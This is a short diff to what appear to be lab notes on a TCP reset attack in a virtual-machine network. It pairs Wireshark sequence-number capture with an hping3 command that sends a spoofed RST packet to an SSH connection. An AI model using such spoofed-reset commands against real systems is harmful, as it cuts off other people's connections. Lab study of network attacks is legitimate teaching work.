@@ -35,8 +35,7 @@ network:
 	- Use wireshark to see the captured packets and there sequence numbers.
 	- Note down the latest sequence numbers.
 ```C
-#sudo hping3 -c 1 -V -S -p <TARGET_PORT> -a <SOURCE_IP> --rst <DEST_IP>
-sudo hping3 -R -p 22 -a --seqnum <NUM> <server_ip> <client_ip>
+sudo hping3 -R -p 22 -s <client_port> -a <clientip> -M <seq> <server_ip>
 ````
 
 ## Network options in virtual machine
